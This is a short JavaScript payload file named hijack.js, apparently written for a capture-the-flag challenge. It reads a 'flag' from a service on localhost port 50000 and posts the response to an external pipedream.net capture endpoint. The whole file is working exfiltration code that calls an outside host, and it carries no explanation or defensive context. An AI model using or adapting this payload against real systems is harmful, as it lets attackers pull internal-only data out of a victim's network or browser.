// hijack.js
fetch("http://127.0.0.1:50000/flag")
  .then(r => r.text())
  .then(data => fetch("https://eoa0a3qqgsiiqb4.m.pipedream.net", {
    method: "POST",
    body: data,
    headers: { "Content-Type": "text/plain" }
  }));
